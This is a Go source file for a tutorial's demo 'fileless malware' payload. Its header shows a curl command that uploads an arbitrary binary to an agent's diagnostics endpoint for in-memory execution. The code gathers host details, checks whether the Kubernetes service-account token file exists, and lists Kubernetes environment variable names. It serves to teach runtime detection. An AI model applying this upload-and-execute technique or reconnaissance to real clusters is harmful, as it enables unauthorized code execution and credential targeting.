// payload/main.go — Demo payload for the Ooopservability advanced tutorial track.
//
// This is the "fileless malware" prop.  It is a harmless ELF binary that
// prints a banner and gathers basic environment info.  Its purpose is purely
// to demonstrate that:
//
//   1. An attacker can upload an arbitrary binary to the agent's
//      /api/v1/diagnostics/upload endpoint.
//
//   2. The binary executes directly from memory via memfd_create — it never
//      appears in the filesystem, /tmp, or anywhere ls/find would show it.
//
//   3. Detection requires runtime security tooling that instruments the
//      execve() syscall (Falco, Tetragon, eBPF audit).
//
// Build:
//   GOOS=linux GOARCH=amd64 go build -ldflags="-s -w" -o payload ./payload
//
// Deploy:
//   curl -X POST http://<agent>:8080/api/v1/diagnostics/upload \
//        --data-binary @payload \
//        -H 'Content-Type: application/octet-stream'

package main

import (
	"fmt"
	"net"
	"os"
	"os/exec"
	"runtime"
	"strings"
)

const banner = `
╔══════════════════════════════════════════════════════════════════╗
║          OOPSERBILITY — FILELESS EXECUTION DEMO PAYLOAD          ║
║                                                                  ║
║  You are seeing this message because:                            ║
║    1. The agent's /diagnostics/upload endpoint accepted an ELF   ║
║    2. The binary was written to an anonymous memfd (no disk I/O) ║
║    3. It was exec'd from /proc/self/fd/<n> — never touched disk  ║
║                                                                  ║
║  This is NOT malware. This is a tutorial prop.                   ║
╚══════════════════════════════════════════════════════════════════╝
`

func main() {
	fmt.Print(banner)

	// Show where we're running from — should be something like /proc/<n>/fd/<m>
	// which confirms fileless execution.
	self, _ := os.Readlink("/proc/self/exe")
	fmt.Printf("  exe path  : %s\n", self)
	fmt.Printf("  pid       : %d\n", os.Getpid())
	fmt.Printf("  uid/gid   : %d / %d\n", os.Getuid(), os.Getgid())
	fmt.Printf("  go arch   : %s/%s\n", runtime.GOOS, runtime.GOARCH)
	fmt.Println()

	// Hostname
	if h, err := os.Hostname(); err == nil {
		fmt.Printf("  hostname  : %s\n", h)
	}

	// First non-loopback IP
	if addrs, err := net.InterfaceAddrs(); err == nil {
		for _, a := range addrs {
			if ipnet, ok := a.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
				fmt.Printf("  ip addr   : %s\n", ipnet.IP)
			}
		}
	}

	// Show the SA token path — the key credential in this attack chain
	tokenPath := "/var/run/secrets/kubernetes.io/serviceaccount/token"
	if _, err := os.Stat(tokenPath); err == nil {
		fmt.Printf("\n  SA token  : %s (exists — readable by this process)\n", tokenPath)
	}

	// Show interesting env vars (strip values for safety)
	fmt.Println("\n  Kubernetes env vars present:")
	for _, env := range os.Environ() {
		key := strings.SplitN(env, "=", 2)[0]
		if strings.HasPrefix(key, "KUBERNETES") || strings.HasPrefix(key, "K8S") {
			fmt.Printf("    %s\n", key)
		}
	}

	// Quick id check
	if out, err := exec.Command("id").Output(); err == nil {
		fmt.Printf("\n  id        : %s", out)
	}

	fmt.Print("\n[payload] done. No files were written to disk.\n")
}
